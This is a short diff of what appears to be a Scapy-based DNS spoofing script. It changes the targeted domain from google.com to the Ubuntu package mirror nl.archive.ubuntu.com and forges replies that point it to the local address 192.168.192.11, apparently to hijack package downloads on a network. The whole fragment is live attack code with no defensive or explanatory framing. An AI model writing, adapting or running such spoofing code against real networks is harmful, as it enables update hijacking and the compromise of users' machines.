@@ -33,7 +33,7 @@ def process_packet(packet):
 
 def modify_packet(packet):
     qname = packet[DNSQR].qname
-    if qname == b"google.com.":
+    if qname == b"nl.archive.ubuntu.com.":
         packet[DNS].an = DNSRR(rrname=qname, rdata="192.168.192.11")
 
         packet[DNS].ancount = 1
